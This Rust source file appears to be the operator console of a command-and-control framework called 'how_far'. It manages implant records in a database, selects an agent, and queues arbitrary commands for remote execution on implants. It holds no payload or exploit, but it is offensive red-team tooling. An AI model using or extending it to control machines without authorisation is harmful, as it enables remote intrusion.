mod data;
mod implant;

use chrono::Utc;
use clap::{Parser, Subcommand};
use how_far_types::{ImplantJob, ImplantJobInner};
use log::{error, info};
use std::collections::HashMap;
use std::str::SplitWhitespace;

use crate::color_level;
use crate::database::IMPLANT_DB;

use self::implant::ImplantCommands;

/// Interactive server for managing implants
#[derive(Parser)]
#[command(version, about = None, long_about = None)]
pub struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Commands for manipulating the database; Alias: db
    #[command(alias = "db", alias = "implants", alias = "agents")]
    Database {
        #[command(subcommand)]
        command: Option<DatabaseCommands>,
    },

    /// Sets the current interactive agent; Alias = select
    #[command(alias = "select")]
    Use { id: u32 },
}

#[derive(Subcommand)]
enum DatabaseCommands {
    /// Lists the entries in the database
    List,
    /// View specified entry
    View { id: u32 },

    /// Removes the specified entry
    #[command(alias = "rm")]
    Remove { id: u32 },
}

/// CLI designed for handling implant commands
#[derive(Parser)]
#[command(version, about = None, long_about = None)]
pub struct ImplantCli {
    #[command(subcommand)]
    command: ImplantCommands,
}

pub async fn parse_cmd(str: String) -> Result<Cli, clap::Error> {
    let str = format!("{} {}", env!("CARGO_PKG_NAME"), str);
    Cli::try_parse_from(str.split_whitespace())
}

pub async fn parse_implant_cmd(str: String) -> Result<ImplantCli, clap::Error> {
    let str = format!("{} {}", env!("CARGO_PKG_NAME"), str);
    ImplantCli::try_parse_from(str.split_whitespace())
}

pub async fn handle_cmd(cli: &Cli) {
    match &cli.command {
        Commands::Database { command } => data::handle_database_cmds(command).await,
        Commands::Use { id } => implant::select_agent(*id).await,
    }
}

pub async fn handle_implant_cmd(cli: &ImplantCli) {
    match &cli.command {
        ImplantCommands::Jobs => implant::list_jobs().await,
        ImplantCommands::Run { cmd, args } => handle_job_cmd(cmd.to_owned(), args.to_owned()).await,
        ImplantCommands::Cancel { job: _ } => todo!(),
        ImplantCommands::Sleep { secs: _ } => todo!(),
        ImplantCommands::Exit => {
            // removes selected agent, cancelling it
            crate::SELECTED_AGENT.lock().unwrap().take();
            return;
        }
    }
}

pub async fn handle_job_cmd(cmd: String, args: Vec<String>) {
    let cmd = match how_far_types::JobCommand::parse_cmd(cmd) {
        Ok(v) => v,
        Err(e) => {
            error!("{} {}", color_level(log::Level::Error), e);
            return;
        }
    };

    match add_run_job(cmd.to_string(), args).await {
        Ok(_) => info!(
            "{} Successfully added job to queue",
            color_level(log::Level::Info)
        ),
        Err(e) => error!("{} {}", color_level(log::Level::Error), e),
    }
}

pub async fn add_run_job(cmd: String, args: Vec<String>) -> Result<(), anyhow::Error> {
    let id = crate::SELECTED_AGENT.lock().unwrap().clone().unwrap().0;
    let job = ImplantJob {
        issue_time: Utc::now(),
        job: ImplantJobInner {
            request_type: how_far_types::ImplantJobType::Run { cmd },
            args,
        },
    };

    IMPLANT_DB.push_job(id, job).await
}

/// Returns boolean denoting whether it successfully ran the command
pub async fn try_external_command(command: &str, args: SplitWhitespace<'_>) -> bool {
    let child = tokio::process::Command::new(command).args(args).spawn();

    match child {
        Ok(mut child) => {
            println!(
                "{} running local: {}\n",
                color_level(log::Level::Info),
                command
            );

            child.wait().await.unwrap();
            true
        }
        Err(e) if e.kind() == tokio::io::ErrorKind::NotFound => false,
        Err(_) => false,
    }
}

pub async fn try_handle_implant_unknown(buf: String) {
    let mut split = buf.split_whitespace();
    let cmd = split.next().unwrap();

    let cmd = match how_far_types::JobCommand::parse_cmd(cmd.to_string()) {
        Ok(v) => v,
        Err(_) => {
            eprintln!("{} Unknown command: use the 'help' command to view possible commands", color_level(log::Level::Warn));
            return;
        }
    };

    match add_run_job(cmd.to_string(), split.map(|v| v.to_string()).collect()).await {
        Ok(_) => info!(
            "{} Successfully added job to queue",
            color_level(log::Level::Info)
        ),
        Err(e) => error!("{} {}", color_level(log::Level::Error), e),
    }
}

/// Handles parsing flags in a SplitWhitespace item
/// default_args refers to args passed with no flags
/// I know it isn't clean but it works
async fn _parse_flags(input: SplitWhitespace<'_>) -> (Vec<String>, HashMap<String, String>) {
    let mut flags_with_args = HashMap::new();
    let mut current_flag = String::new();
    let mut is_long_string = false;
    let mut long_string = Vec::new(); // In case someone has a long input ("my home/repos")
    let mut args = Vec::new();

    for word in input {
        if word.starts_with('-') {
            if !current_flag.is_empty() {
                flags_with_args.insert(current_flag.clone(), String::new());
            }
            word.trim_start_matches('-').clone_into(&mut current_flag);
        } else if !current_flag.is_empty() {
            if word.starts_with('"') {
                long_string.push(word.trim_start_matches('\"'));
                is_long_string = true
            } else if word.ends_with('"') {
                long_string.push(word.trim_end_matches('\"'));

                flags_with_args.insert(current_flag.clone(), long_string.join(" "));
                long_string.clear();
                current_flag.clear();

                is_long_string = false;
            } else if is_long_string {
                long_string.push(word);
            } else {
                flags_with_args.insert(current_flag.clone(), word.to_owned());
                current_flag.clear();
            }
        } else {
            // Default argument handling
            // Ex: test_args SOME_ARGUMENT
            args.push(word.to_string());
        }
    }

    if !current_flag.is_empty() {
        flags_with_args.insert(current_flag.clone(), String::new());
    }

    (args, flags_with_args)
}
